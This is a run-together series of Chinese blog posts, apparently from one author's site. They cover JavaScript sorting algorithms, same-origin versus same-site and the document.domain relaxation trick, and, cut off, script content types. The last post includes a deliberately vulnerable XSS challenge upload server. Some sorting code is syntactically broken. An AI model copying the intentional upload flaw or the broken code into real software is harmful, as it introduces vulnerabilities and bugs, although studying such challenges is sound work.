O(n)，你必須要加上一個小優化才行。不然以我們上面的情況，雖然不會做任何交換，但還是會把每一個元素都 check 一遍。 可以加上一個 flag 標注內圈有沒有交換的情形發生，如果沒有，就代表陣列已經排序好了，就可以直接跳掉。 function optimzedBubbleSort = (arr) => &#123; const n = arr.length; let swapped = true; // 一共要跑 n 輪 for (let i = 0; i &lt; n &amp;&amp; swapped; i++) &#123; // 從第一個元素開始，不斷跑到第 n - 1 - i 個 // 原本是 n - 1，會再加上 - i 是因為最後 i 個元素已經排好了 // 所以沒必要跟那些排好的元素比較 swapped = false; for (let j = 0; j &lt; n - 1 - i; j++) &#123; if (arr[j] > arr[j + 1]) &#123; swapped = true; [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]]; &#125; &#125; &#125; return arr; &#125; 改良之後，如果輸入是已經排好的陣列，就只會跑一次內圈，然後就跳掉了，所以時間複雜度會是O(n)。 插入排序法（Insertion Sort）插入排序法是我認為相當直覺的一個排序法，簡單來說就是： 你玩撲克牌的時候會用到的排序法 就是不斷把撲克牌插入到適合的位置嘛，只是你玩牌的時候可能一次插入好多牌，而插入排序法是一次插入一張牌。 （圖片來源：https://commons.wikimedia.org/wiki/File:Insertion-sort-example.gif ） 這邊比較值得注意的是在插入時候的演算法，不斷往前找到適合的位置，並且在邊找的時候就邊挪動元素了，所以等找到的時候就可以直接插入。 const insertionSort = (arr) => &#123; const n = arr.length; // 假設第一個元素已經排好，所以從 1 開始跑 for (let i = 1; i &lt; n; i++) &#123; // position 表示可以插入的位置 let position = i; // 先把要插入的元素存起來 const value = arr[i]; // 開始往前找，只要符合這條件就代表這個位置是可以插入的 // 邊找的時候就可以邊把元素往後挪，騰出空間 while (i >= 0 &amp;&amp; arr[position - 1] > value) &#123; [arr[position], arr[position - 1]] = [arr[position - 1], arr[position]]; position--; &#125; // 找到適合的位置，放入元素 arr[position] = value; &#125; return arr; &#125; 插入排序法的最佳情形出現在輸入元素已經是排序好的情況，這時候裡面的while只要跑一次就會結束了，所以時間複雜到就是外圈的O(n)而已。 這邊提一個小插曲，我當初在寫示範跟測試的程式碼的時候沒寫好，導致拿來測試的陣列都是已經排好的，我就想說：「怎麼插入排序法比快速排序法還快，不合理啊！」 合併排序法（Merge Sort）接著要進入到比較快的排序法了，合併排序法算是滿好理解的一個： 切一半，排好左邊，排好右邊，合併 談合併排序法的時候我喜歡先談合併這個步驟，其實就是把兩個各自排序好的陣列合併成一個。這一步其實也滿簡單，因為兩邊都已經排序好了嘛，所以就是不斷看兩邊的第一個元素，誰小就抓誰下來，接著左邊抓完就抓右邊，反之亦然。 （圖片來源：http://www.java2novice.com/java-sorting-algorithms/merge-sort/ ） 我自己之前在看合併排序的時候，發現可以寫成一個比較好懂，但是空間耗費比較多的版本： const simpleMergeSort = (arr) => &#123; // 合併 const merge = (leftArray, rightArray) => &#123; let result = []; let nowIndex = 0, left = 0, right = 0; const leftLength = leftArray.length; const rightLength = rightArray.length; // 如果左右兩邊都沒抓完，就看誰比較小抓誰 while (left &lt; leftLength &amp;&amp; right &lt; rightLength) &#123; if (leftArray[left] &lt; rightArray[right]) &#123; result[nowIndex++] = leftArray[left++]; &#125; else &#123; result[nowIndex++] = rightArray[right++]; &#125; &#125; // 跑到這裡代表左右兩邊其中一邊抓完了 // 如果是左邊沒抓完，全部抓下來 while (left &lt; leftLength) &#123; result[nowIndex++] = leftArray[left++]; &#125; // 右邊沒抓完，全部抓下來 while (right &lt; rightLength) &#123; result[nowIndex++] = rightArray[right++]; &#125; // 把合併好的陣列直接傳回去 return result; &#125; const _mergeSort = (arr) => &#123; const length = arr.length; if (length &lt;= 1) return arr; // 切兩半 const middle = Math.floor(length / 2); // 排左邊 const leftArray = _mergeSort(arr.slice(0, middle)); // 排右邊 const rightArray = _mergeSort(arr.slice(middle, length)); // 合併後丟回去 return merge(leftArray, rightArray); &#125; return _mergeSort(arr); &#125; 對我來說，比較簡單的理由是滿直覺的，你就直接用 slice 切成兩個陣列，排序好之後合併起來就好。 但比較省空間的做法是直接更改原來的陣列就好，這時候我們的參數會變得不太一樣： function mergeSort = (arr) => &#123; const merge = (array, start, middle, end) => &#123; // 宣告一個暫時的陣列來放合併後的結果 let temp = []; let nowIndex = 0; let left = start; let right = middle + 1; // 這邊都跟上面一樣 while (left &lt;= middle &amp;&amp; right &lt;= end) &#123; if (array[left] &lt; array[right]) &#123; temp[nowIndex++] = array[left++]; &#125; else &#123; temp[nowIndex++] = array[right++]; &#125; &#125; while (left &lt;= middle) &#123; temp[nowIndex++] = array[left++]; &#125; while (right &lt;= end) &#123; temp[nowIndex++] = array[right++]; &#125; // 要把合併後的陣列放回去 array[start ~ end] for (let i = start; i &lt;= end; i++) &#123; array[i] = temp[i - start]; &#125; &#125; // 代表要從 start 排到 end const _mergeSort = (array, start, end) => &#123; if (end &lt;= start) return; const middle = Math.floor((start + end) / 2); // 對左右兩半排序 _mergeSort(array, start, middle); _mergeSort(array, middle + 1, end); merge(array, start, middle, end); return array; &#125; return _mergeSort(arr, 0, arr.length - 1); &#125; 因為是直接更改原本的陣列，所以要多傳幾個數字進去，代表我要排序這個陣列的那一段。而呼叫完之後，你就可以預設這一段的陣列已經是排序好的了。 基本上流程都跟上面簡單版的沒兩樣，但省了一些記憶體空間。 快速排序法（Quick Sort）快速排序法我一開始覺得滿複雜，知道原理之後就覺得沒那麼難了，其實原理滿簡單： 找一個數，並且把這個數調整到：讓左邊的元素比它小，右邊的元素比它大，再對左右兩遍做一樣的事 那個數我們稱作 pivot，會把數列分割成左右兩邊。 例如說現在有一個數列是：14, 7, 6, 9, 10, 20, 15 我們挑選 14 當作 pivot，調整過後變成：7, 6, 9 , 10, 14, 20, 15，左邊都比它小，右邊都比它大。 而當你把 14 調整好的時候，其實這個元素就排好了！因為左邊比它小，右邊比它大嘛，所以這一個數字就排好了。接著只要對左右兩邊還沒排好的也做快速排序就行了。 而快速排序的核心在於你要怎麼找到那個數，如果你找的數字剛好是數列的中位數，那當然效率最高。如果找的是最小的數，那就是最壞的情形，時間複雜度就變成O(n^2)，有分割跟沒分割一樣。 我們直接假設第一個數就是 pivot，這樣比較方便。 那再來有一個問題是，要怎麼把這個數字調整到左邊比它小，右邊比它大呢？我們可以維護一個變數叫做 splitIndex，讓這個 index 左邊的元素都比 pivot 小，而這個 index 本身以及它右邊的元素都比 pivot 大。 當你掃一遍陣列，發現某個元素比 pivot 小的時候，就把這個元素跟 splitIndex 上的元素交換，並且把 splitIndex + 1，就可以做到我們上面想做的事情了。最後記得把 pivot 跟 splitIndex - 1（也就是最後一個比它小的元素）交換，就能夠把 pivot 放到正確的位置上了。 可以參考下面的 gif，或是直接去VISUALGO看看。 （來源：https://github.com/hustcc/JS-Sorting-Algorithm/blob/master/6.quickSort.md ） function quickSort = (arr) => &#123; const swap = (array, i , j) => &#123; [array[i], array[j]] = [array[j], array[i]]; &#125; const partition = (array, start, end) => &#123; let splitIndex = start + 1; for (let i = start + 1; i &lt;= end; i++) &#123; if (array[i] &lt; array[start]) &#123; swap(array, i, splitIndex); splitIndex++; &#125; &#125; // 記得把 pivot 跟最後一個比它小的元素互換 swap(array, start, splitIndex - 1); return splitIndex - 1; &#125; const _quickSort = (array, start, end) => &#123; if (start >= end) return array; // 在 partition 裡面調整數列，並且回傳 pivot 的 index const middle = partition(array, start, end); _quickSort(array, start, middle - 1); _quickSort(array, middle + 1, end); return array; &#125;; return _quickSort(arr, 0, arr.length - 1); &#125; 堆排序（Heap Sort）Heap 是一種資料結構，並且有分兩種：max heap 跟 min heap，兩種的原理其實雷同，我們直接拿 max heap 來講。 先讓大家看一張 max heap 的圖片： （資料來源：https://www.tutorialspoint.com/data_structures_algorithms/heap_data_structure.htm ） 大家可以發現，max heap 滿足了兩個性質： 父節點一定大於子節點 整個樹的根節點一定是最大值（可以由 1 推出來） 而要用陣列表示 heap 也很簡單，會像這樣： （資料來源：http://notepad.yehyeh.net/Content/Algorithm/Sort/Heap/Heap.php ） 所以 heap sort 就是利用這個資料結構做排序，流程很簡單： 先把讀進來的陣列建成 max heap（這時候 arr[0] 一定是這陣列最大值） 把 arr[0] 跟最後一個節點互換（其實是最後一個還沒排序過的節點） 調整成 max heap，回到步驟 2 heap sort 其實有點複雜，複雜到可以再獨立出來一篇了… 但簡單來說呢，就是改良版的選擇排序法，每一次都選最大值出來，然後把剩下的數字再調整成 max heap。 function heapSort = (arr) => &#123; function heapify(arr, length, node) &#123; const left = node * 2 + 1; const right = node * 2 + 2; // 先預設最大的節點是自己 let max = node; if (left &lt; length &amp;&amp; arr[left] > arr[max]) &#123; max = left; &#125; if (right &lt; length &amp;&amp; arr[right] > arr[max]) &#123; max = right; &#125; // 如果左右兩邊有任何一個比 node 大的話 if (max !== node) &#123; // 就把兩個互換 [arr[node], arr[max]] = [arr[max], arr[node]]; // 接著繼續 heapfiy heapify(arr, length, max); &#125; &#125; // build max heap const length = arr.length; for (let i = Math.floor(length / 2) - 1; i>=0; i--) &#123; heapify(arr, length, i); &#125; // 排序 for (let i = length - 1; i > 0; i--) &#123; [arr[0], arr[i]] = [arr[i], arr[0]]; heapify(arr, i, 0); &#125; return arr; &#125; 總結其實仔細研究過後，就會發現每一個排序演算法都有值得參考的地方，而且每個排序法都滿有趣的。也會發現懂原理是一回事，寫不寫的出來又是另外一回事了。這篇就當作自己的排序法筆記吧，如果有任何錯誤麻煩不吝指出。 如果想要自己玩玩看的話，我有放到 Github 上，有寫好 testcase，改一改就可以直接測了，應該滿方便的。 因為要測試的關係，所以每個排序法前面都會加上：arr = arr.slice()避免修改到原本的 array。 測試的過程也滿有趣的，我發現有些 ES6 語法（例如說很潮的交換語法或甚至是let）有時候會拖慢執行速度，因此我之前有把語法全部改回 ES5，發現效率快了不少，但這篇因為重點不在效能，所以還是全部用 ES6 的語法。 參考資料 [演算法] 堆積排序法(Heap Sort) 常见排序算法 - 堆排序 (Heap Sort) 排序之堆積排序法(Heap Sort) js算法:heap sort 使用堆排序 JS-Sorting-Algorithm&#x2F;7.heapSort.md 用 JavaScript 學習資料結構和演算法：排序（Sort）與搜尋（Search）篇","link":"/2017/08/27/review-the-classical-sort-algorithm-with-javascript/"},{"title":"忍術！把 same site 變 same origin 之術！","text":"Same site 跟 same origin 雖然看起來有點像，但其實差別不小，而這個差別也會影響到瀏覽器如何看待這兩個網站的關係還有給予的權限。 這篇文章將會談到： Origin 是什麼？怎樣是 same origin？ Site 是什麼？怎樣是 same site？ same origin 跟 same site 的差別是什麼？ 如何把 same site 變成 same origin？ 事不宜遲，就讓我們開始吧！ （開始之前先回答一個疑問。是的，標題的靈感來自於忍者哈特利） 2022-01-20：修改「細究 same site」段落，補充 scheme 相關歷史，感謝 @littlegoodjack 初探 origin 與 site先提供一下簡單好懂但有些許錯誤的解釋，待會我們再來一個個修正。 Origin 的話就是：scheme + port + host，三者加起來就是 origin。 假設有個 URL 是 https://huli.tw/abc，各個組成分別是： scheme：https port：443（https 的預設 port） host：huli.tw 因此它的 origin 就是 https://huli.tw，可以看到 path 的部分 /abc 並不影響 origin，而 port 的部份 https 已經蘊含預設就是 443 port 了。 而 same origin 就是兩個 URL 的 origin 要是一樣的，舉例來說： https://huli.tw/abc 跟 https://huli.tw/hello/yo 是 same origin，因為 scheme、port 跟 host 都一樣，path 不影響結果 https://huli.tw 跟 http://huli.tw 不是 same origin，因為 scheme 不一樣 http://huli.tw 跟 http://huli.tw:8080 不是 same origin，因為 port 不一樣 https://huli.tw 跟 https://blog.huli.tw 不是 same origin，因為 host 不一樣 從上面幾個範例可以看出 same origin 的條件相當嚴苛，基本上除了 path 以外的部分都要一樣，才能叫做 same origin。 接著我們看一下 site，site 的話看的東西比 origin 少，只看 scheme 跟 host，所以不看 port。而兩個 URL 是 same site 的定義也更寬鬆了，host 的部分不用完全相同，只要是 subdomain 也算是 same site。 舉例來說， https://huli.tw/abc 跟 https://huli.tw/hello/yo 是 same site，因為 scheme 跟 host 都一樣 https://huli.tw 跟 http://huli.tw 不是 same site，因為 scheme 不一樣 http://huli.tw 跟 http://huli.tw:8080 是 same site，因為 port 不影響結果 https://huli.tw 跟 https://blog.huli.tw 是 same site，因為 huli.tw 跟 blog.huli.tw 都在同一個 domain huli.tw 底下 https://abc.huli.tw 跟 https://blog.huli.tw 也是 same site，因為 abc.huli.tw 跟 blog.huli.tw 都在同一個 domain huli.tw 底下 跟 same origin 比起來，same site 顯然更為寬鬆，port 不同也是 same site，host 的部分只要隸屬於同個 parent domain 基本上也是 same site。 但就如同我開頭說的，上面的定義雖然在大多數情況下都正確，但其實並不精確，底下我們直接來看 spec，看看有哪些狀況例外。 細究 same origin在 CORS 完全手冊（一）：為什麼會發生 CORS 錯誤？一文中我有提過 origin 的定義，在 HTML 規範中的 7.5 Origin 章節裡面可以看到完整的定義，先來看一下規範裡面對 origin 的說明： Origins are the fundamental currency of the web’s security model. Two actors in the web platform that share an origin are assumed to trust each other and to have the same authority. Actors with differing origins are considered potentially hostile versus each other, and are isolated from each other to varying degrees. 這邊寫得很清楚，開宗明義就講了如果兩個網站有著相同的 origin，就意味著這兩個網站信任彼此，但如果是不同的 origin，就會被隔離開來而且受到限制。 接著規範裡把 origin 分成兩種，一種是 An opaque origin，另一種是 A tuple origin。 Opaque origin 可以想成是在特殊狀況下才會出現的 origin，例如說我在本機開啟一個網頁，網址會是 file:///...，這時候在網頁內發送 request，origin 就會是 opaque origin，也就是 null。 Tuple origin 則是比較常見而且我們也比較關心的 origin，文件寫說 tuple 內包含了： scheme (an ASCII string). host (a host). port (null or a 16-bit unsigned integer). domain (null or a domain). Null unless stated otherwise. 你可能會好奇為什麼又有 host 又有 domain，這個我們晚點會提到。 接著，在規範裡面也有講到判斷 A 跟 B 兩個 origin 是否是 same origin 的演算法： If A and B are the same opaque origin, then return true. If A and B are both tuple origins and their schemes, hosts, and port are identical, then return true. Return false. 要嘛兩個是一樣的 opaque origin，否則的話要 scheme、host 跟 port 三者都相等，才是 same origin。除了 same origin 以外，你還會在 spec 裡面看到另外一個詞叫做「same origin-domain」，這個我們之後也會提到。 如同我前面說的，same origin 是很嚴格的限制，以 https://huli.tw/api 這個網址來說，因為 origin 不看 path，所以它的 origin 會是 https://huli.tw，也就是說，跟它同源的網站的網址一定都是 https://huli.tw/*，才會是同源的。 https://huli.tw 跟 https://blog.huli.tw 雖然只是網域跟子網域的關係，但也不是同源的，因為 host 不一樣。 記住這點，這很重要。 這邊仔細探究的 origin 跟 same origin 的定義跟開頭所說的「不精確的說法」比起來，差別在於多了一個 opaque origin 以及 same origin-domain，還有 origin tuple 中多了一個我們剛剛都沒用到的「domain」。 最後再提一個東西，當我說「https://huli.tw/api 的 origin 是 https://huli.tw」的時候，更精確的說法是：「https://huli.tw/api 的 origin 序列化（serialization）過的結果是 https://huli.tw」 這是因為前面有提到 origin 其實是個 tuple，表示起來會像這樣：(https, huli.tw, null, null)，而 tuple 變成字串後才會是 https://huli.tw。tuple 的表示法跟序列化過後的字串比起來，我認為後者比較好讀，因此當兩者能表現出的資訊類似時，我會採用後者那種做法 細究 same sitesite 的定義也在同一份 spec 裡面，寫說： A site is an opaque origin or a scheme-and-host. 所以 site 可以是 opaque origin，或者是 scheme-and-host。 在 spec 中可以發現除了 same site 以外，還有另外一個名詞叫做「schemelessly same site」，這兩個的差別也很明顯，same site 會看 scheme，而 schemelessly same site 則不看 scheme。 因此，在判斷兩個 origin A 跟 B 是否是 same site 時，演算法是這樣的： Two origins, A and B, are said to be same site if both of the following statements are true: A and B are schemelessly same site A and B are either both opaque origins, or both tuple origins with the same scheme 如果 A 跟 B 是 same site，要嘛他們都是 opaque origin，要嘛兩個有著同樣的 scheme 而且兩個是 schemelessly same site。 所以 same site 是會看 scheme 的，http 跟 https 的兩個網址絕對不會是 same site，但有可能是 schemelessly same site。 這邊其實有一小段歷史，那就是 same site 剛出來的時候，其實是不看 scheme 的，是到後來才把 scheme 納入考量。 在這份 2016 的 RFC: Same-site Cookies 中，可以看到對於 same site 的判斷並沒有 scheme，所以那時候 https://huli.tw 跟 http://huli.tw 是 same site。 一直到 2019 年 6 月的時候，才開始在討論是否要把 scheme 列入考量，詳情可參考：Treat http://foo.com -> https://foo.com requests as Sec-Fetch-Site: cross-site. #34。 那時 same site 的 spec 並不是定義在我們今天看的 HTML spec 裡面，而是另外一份 URL spec，所以後來討論被移到那邊去：Consider introducing a “same-site” concept that includes scheme. #448，接著在 2019 年 9 月，就有了這個 PR：Tighten ‘same site’ checks to include ‘scheme’. #449，才正式在規格中把 scheme 列入考量，將 same site 定義成「會看 scheme」，而不看 scheme 的則引入了一個新的名詞：schemelessly same site。 接著過了兩個月，相關的 spec 從 URL 移到 HTML，可參考這兩個 PR：Let HTML handle the “same site” definition #457、Define (schemelessly) same site for origins #5076 Spec 歸 spec，有時候規格修正不代表瀏覽器就會馬上跟上，那瀏覽器目前的實作為何呢？ Chrome 在 2020 年 11 月時有寫了一篇文章：Schemeful Same-Site，看來在那時瀏覽器還是把不同 scheme 也當作是 same site，但從 Chrome platform status: Feature: Schemeful same-site 中我們可以得知，Chrome 從 89 以後就把 scheme 也列入考慮了。 至於 Firefox 的話，從這個 issue：[meta] Enable cookie sameSite schemeful 的狀態看來，似乎還沒有把這個行為當作是預設值，如果沒有特別調整設定，scheme 不同也會被看作是 same site。 看完了歷史，接著就來看一下最重要的 schemelessly same site 是如何判斷的： Opaque 的部份我們就先不說了，上面的重點很顯然是一個新的名詞：「registrable domain」，在判斷兩個 host 是否是 same site 時，會用這個來做比較。 這個 registrable domain 的定義在另外一份 URL 的 spec 中： A host’s registrable domain is a domain formed by the most specific public suffix, along with the domain label immediately preceding it, if any 這邊又提到一個新的詞：「public suffix」，這個東西我們在利用 Cookie 特性進行的 DoS 攻擊：Cookie 炸彈時就有提到過。 先舉個例子會比較好懂，blog.huli.tw 的 registrable domain 會是 huli.tw，而 huli.tw 的 registrable domain 也是 huli.tw。 但是 bob.github.io 的 registrable domain 不是 github.io，而是 bob.github.io。 這是為什麼呢？底下我簡單解釋一下。 如果沒有「registrable domain」以及「public suffix」這兩個概念的話，那 same site 的定義就是開頭所講的，huli.tw 跟 blog.huli.tw 是 same site，這沒什麼問題。 但如果是這樣的話，bob.github.io 跟 alice.github.io 也是 same site 了。 咦，這樣不好嗎？ 不好，因為 github.io 是 GitHub pages 的服務，每一個 GitHub 的使用者都會有自己專屬的 subdomain 可以用，但 GitHub 不希望 bob.github.io 能干擾到 alice.github.io，因為它們其實就是完全獨立的兩個網站，並不像 huli.tw 跟 blog.huli.tw 一樣，擁有者都是我。 因此，public suffix 的概念就出現了，這是一個人工維護的清單，裡面有著這些「不想被當作是同個網站的列表」，我舉幾個例子： github.io com.tw s3.amazonaws.com azurestaticapps.net herokuapp.com 所以瀏覽器參照這張表之後，就會認定 bob.github.io 跟 alice.github.io 其實並沒有關係，不是 same site。這也有個專有名詞叫做 eTLD，細節可參考：如何判斷兩個網域的擁有者是否相同？ 如上所述，因為 github.io 存在於 public suffix list 裡面，所以 bob.github.io 的 registrable domain 是 bob.github.io，而 alice.github.io 的 registrable domain 則是 alice.github.io。 所以呢，我們一開始講的 same site 的定義並不正確，兩個 host 看起來很像是隸屬於同一個 parent domain，並不代表就一定是 same site，還要看有沒有在 public suffix list 裡面。 而 bob.github.io 跟 alice.github.io 不是 same site，因為他們的 registrable domain 不一樣。 blog.huli.tw 跟 huli.tw 還有 test.huli.tw 這三個 host 都是 same site，因為 registrable domain 都是 huli.tw。 spec 中有附上一張更清楚的表格，大家可以仔細看一下： 最後，為 same site 做個總結： 有 same site 跟 schemelessly same site，較常用的是前者 要比較兩個 host 是否為 same site 時，要看 registrable domain 要決定 registrable domain 是什麼，要看 public suffix list 兩個 host 僅管看起來隸屬於同個 parent domain，但因為有 public suffix 的存在，不一定是 same site same site 不看 port，所以 http://blog.huli.tw:8888 跟 http://huli.tw 是 same site Same origin 與 same siteSame origin 看的是： scheme port host 而 same site 看的是： scheme host(registrable domain) 如果兩個網站是 same origin，那就一定是 same site，因為 same origin 的判斷標準更為嚴苛。 兩者最大的差別就在於： same origin 看 port，same site 不看 same origin 看 host，same site 看 registrable domain 底下舉幾個例子： A B same origin same site 說明 http://huli.tw:8080 http://huli.tw X O same site 不看 port https://blog.huli.tw https://huli.tw X O registrable domain 相同 https://alice.github.io https://github.io X X github.io 在 public suffix 裡面 https://a.alice.github.io https://b.alice.github.io X O registrable domain 相同 https://bob.github.io/page1 https://bob.github.io/about O O 不管 path 神奇的 document.domain幫 same origin 跟 same site 鋪陳了這麼多，總算來到了一開始想講的主題，也就是標題所說的東西。 在看 origin 的 spec 時，就有提到一個神奇的「domain」屬性，不知道要幹嘛，甚至還有「same origin-domain」這個東西，在 origin 的 spec 中其實有一段綠底的 note，直接破題： 寫說 origin 除了 domain 這個屬性以外都是不可變的，而這屬性可以透過 document.domain 來改變。在 spec 中有一個章節 7.5.2 Relaxing the same-origin restriction，就是在講這件事情，我節錄一小段： (document.domain) can be set to a value that removes subdomains, to change the origin’s domain to allow pages on other subdomains of the same domain (if they do the same thing) to access each other. This enables pages on different hosts of a domain to synchronously access each other’s DOMs. 為了方便大家理解，直接來個 demo。 我改了本機的 /etc/hosts，內容如下： 127.0.0.1 alice.example.com 127.0.0.1 bob.example.com 如此一來，這兩個網址都會連到 local，接著我開了一個簡單的 HTTP server，寫了一個簡單的 HTML，讓它跑在 localhost:5555 &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\" /> &lt;meta name=\"viewport\" content =\"width=device-width, initial-scale=1\" /> &lt;/head> &lt;body> &lt;h1>&lt;/h1> &lt;h2>&lt;/h2> &lt;button onclick=\"load('alice')\">load alice iframe&lt;/button> &lt;button onclick=\"load('bob')\">load bob iframe&lt;/button> &lt;button onclick=\"access()\">access iframe content&lt;/button> &lt;button onclick=\"update()\">update domain&lt;/button> &lt;br> &lt;br> &lt;/body> &lt;script> const name = document.domain.replace('.example.com', '') document.querySelector('h1').innerText = name document.querySelector('h2').innerText = Math.random() function load(name) &#123; const iframe = document.createElement('iframe') iframe.src = 'http://' + name + '.example.com:5555' document.body.appendChild(iframe) &#125; function access() &#123; const win = document.querySelector('iframe').contentWindow alert('secret:' + win.document.querySelector('h2').innerText) &#125; function update() &#123; document.domain = 'example.com' &#125; &lt;/script> &lt;/html> 頁面上有三個功能： 載入 iframe 讀取 iframe 內 DOM 的資料 改變 document.domain 我們先開啟 http://alice.example.com:5555，然後載入 http://bob.example.com:5555 的 iframe，接著按下 alice 頁面中的「access iframe content」： 你會在 console 看到錯誤訊息，寫說： Uncaught DOMException: Blocked a frame with origin “http://alice.example.com:5555“ from accessing a cross-origin frame. 因為 alice 跟 bob 雖然是 same site，但是並不是 same origin，而 iframe 如果要存取到 DOM 的內容，必須是 same origin 才行。 接著我們雙雙按下 alice 跟 bob 頁面中的「update domain」，按完以後再按一次「access iframe content」： 你會看到這一次，我們順便取得了 bob 頁面中的資料，成功把 http://alice.example.com:5555 跟 http://bob.example.com:5555 從 cross origin 變成了 same origin，這就是忍術，same site 變成 same origin 之術！ 這一招並不是任意兩個網頁都可以使用的，基本上只有 same site 的網站可以，而且在設置時還會做很多檢查： 以 github.io 為例，如果 alice.github.io 執行了 document.domain = &#39;github.io&#39;，console 就會跳出錯誤： Uncaught DOMException: Failed to set the ‘domain’ property on ‘Document’: ‘github.io’ is a top-level domain. 為什麼改變 document.domain 後，兩個頁面就會變成是 same origin 呢？其實嚴格來說不是 same origin，而是 same origin-domain，在 docuemnt 相關的 spec 中有寫到，有些檢查是看 same origin-domain，而不是 same origin。 那怎麼看兩個 origin 是不是 same origin-domain 呢？一起來看看 spec 怎麼說： If A and B are the same opaque origin, then return true. If A and B are both tuple origins, run these substeps: If A and B’s schemes are identical, and their domains are identical and non-null, then return true. Otherwise, if A and B are same origin and their domains are identical and null, then return true. Return false. 如果 A 跟 B 的 scheme 一樣，而且 domain 屬性也一樣而且不是 null 的話，就回傳 true，否則的話檢查 A 跟 B 是不是 same origin 而且 domain 都是 null，成立才回傳 true。 這邊可以看到幾個有趣的地方： 一定要兩個網頁都沒有設置 domain 或是都有設置，才有可能回傳 true（這很重要） 如果有設置 domain 的話，same origin-domain 就不檢查 port 了 document.domain 就是改變 origin tuple 中 domain 這個屬性用的。 在上面的範例中，我們兩個網頁 http://alice.example.com:5555 跟 http://bob.example.com:5555 都將自己的 domain 改成 example.com，所以是 same origin-domain。 底下我們來看看三個有趣的案例。 案例一：單方面改變如果 https://alice.example.com 執行了 document.domain = &#39;example.com&#39;，接著把 https://example.com 嵌入在 iframe 裡面，它們兩個「依舊不是 same origin-domain」，因為 alice 頁面有 domain 屬性，但是 example.com 頁面沒有 domain 屬性。 example.com 也要執行 document.domain = &#39;example.com&#39;，兩者才會是 same origin-domain。 案例二：消失的 porthttp://alice.example.com:1234 跟 http://alice.example.com:4567，因為 port 不一樣，所以是 cross origin，但如果兩個頁面都執行了 document.domain = &#39;alice.example.com&#39; 的話，就會變成 same origin-domain，可以存取彼此的 DOM，因為它不看 port。 案例三：我不是原來的我假設 http://alice.example.com 把自己嵌入在 iframe 裡面，那 iframe 跟原本的頁面顯然是 same origin，可以存取彼此的 DOM。 但是呢，如果我在頁面上執行了 document.domain = &#39;alice.example.com&#39;，這頁面就會被設置 domain 屬性，而 iframe 裡的頁面並沒有設置 domain 屬性，所以它們就變得不是 same origin-domain 了。 document.domain 的淡出及退場用這一招來放寬 same origin 的限制應該滿早就有了，而到現在還沒有拔除掉就是為了相容早期的行為，我猜在早期的時候很多網頁都會用這招，才能夠去存取 same site 但是 cross origin 的頁面。 但這樣做顯然是有風險的，例如說假設某個 subdomain 有 XSS 漏洞，就有機會利用這個方式擴大影響範圍，在 2016 年由 @fin1te 所寫的一篇文章 An XSS on Facebook via PNGs &amp; Wonky Content Types 中，就利用了這個手法，成功從 subdomain 繞到 www.facebook.com 進行 XSS，提升漏洞的影響力。 也因為安全性的問題，Chrome 在 2022 年 1 月 11 日於部落格發布了一篇文章：Chrome will disable modifying document.domain to relax the same-origin policy，文中說明了最快從 Chrome 101 版開始，就會停止支援更改 document.domain。 原本的行為可以用 postMessage 或是 Channel Messaging API 來取代，只是要多寫一些程式碼就是了，畢竟沒辦法像原本直接操作 DOM 這麼方便。 而如果有網頁想繼續使用這個修改 document.domain 的功能，需要在 response header 裡面帶上 Origin-Agent-Cluster: ?0，才能繼續使用。 文中也有附上關於這個改動的相關討論串：Deprecating document.domain setter. #564 結語我似乎是兩三年以前知道這招的，知道可以透過改變 document.domain 讓兩個網站從 cross origin 變成 same origin，但我自己在實務上是還沒看過有人這樣用就是了。 這次會想寫這篇，就是因為前幾天看到了文末附的文章，得知了在不久後的未來，這一招將會被 Chrome 預設停用。雖然說出發點只是為了寫這個行為，但其實花更多時間在 origin 以及 site 的定義，在看 spec 的過程中也注意到一些以前沒注意到的盲點，像是 same site 會看 public suffix 之類的。 關於 origin，其實還有更多細節可以談，例如說到底什麼是 opaque origin？但一方面再講下去就太長，另一方面我也還沒仔細研究，先留下一些參考資料，未來有機會再把這個坑補完： What is an “opaque origin” and why do we care? #321 chromium&#x2F;src&#x2F;+&#x2F;HEAD&#x2F;url&#x2F;origin.h File origins 最後，希望這篇有讓大家更理解什麼是 same origin，什麼又是 same site，以及更細節的 same origin-domain 還有 schemelessly same site。 參考資料： HTML spec URL spec 如何判斷兩個網域的擁有者是否相同？ Chrome will disable modifying document.domain to relax the same-origin policy","link":"/2022/01/16/same-site-to-same-origin-document-domain/"},{"title":"script type 知多少？","text":"前陣子剛好玩到不少跟 content type 有關的題目，寫一篇來記錄一下。 老樣子，直接講答案不有趣，開頭先來三個問題： 問題一請問底下的程式碼中，a.js 的 content type 要是什麼才會成功載入程式碼？（先假設 MIME type sniffing 是關閉的） 例如說 text/javascript 就是一個答案，還有嗎？ &lt;script src=\"https://example.com/a.js\"> 問題二請問底下的 “???” 中可以填入哪些值？例如說 text/javascript 就是一個答案，module 也是一個答案。 &lt;script type=\"???\"> &lt;/script> 問題三現在你有個網頁 /test，請問 response 中的 content-type 如果設定成哪些，瀏覽器載入後就能夠執行 JS 程式碼？ 例如說 text/html 就是一個，text/xml 也是一個。 底下就讓我們來看一下答案。 問題一：&lt;script&gt; 能接受的 content type會開始思考這個問題以及答案，是來自於 @ankursundara 在去年年底出的一個 XSS 挑戰：https://twitter.com/ankursundara/status/1460810934713081862 部分程式碼如下： @app.post('/upload') def upload(): try: file_storage = request.files['file'] mimetype = file_storage.mimetype.lower() or 'application/octet-stream' if 'script' in mimetype: mimetype = 'application/octet-stream' content = file_storage.read().decode('latin1') # dont DOS please if len(content) &lt; 1024*1024: data = &#123; 'mimetype': mimetype, 'content': content &#125; filename = token_hex(16) store.set(filename, json.dumps(data), ex=300) return redirect(f'/uploads/&#123;filename&#125;', code=302) except: pass return 'Invalid Upload', 400 @app.get('/uploads/&lt;filename>') def get_upload(filename): data = store.get(filename) if data: data = json.loads(data) return data['content'].encode('latin1'), 200, &#123;'Content-Type': data['mimetype']&#125; else: return \"Not Found\", 404 @app.after_request def headers(response): response.headers[\"Content-Security-Policy\"] = \"script-src 'self'; object-src 'none';\" response.headers[\"X-Content-Type-Options\"] = 'nosniff' return response 簡單來說，你可以上傳任意檔案，但如果檔案的 MIME type 有 script 的話，就會變成 application/octet-stream。 然後 X-Content-Type-Options 有設置成 nosniff，所以 MIME type 設置什麼就是什麼了。 目標的話則是順利執行 XSS。 從上面的程式碼不難看出，可以上傳一個 HTML 檔案，但因為 CSP 有 script-src &#39;self&#39; 的關係，因此就算能上傳 HTML，也不能用 inline script，只能用 &lt;script src=&quot;/uploads/xxx&quot;&gt; 這種方式引入。 而如果 /uploads/xxx 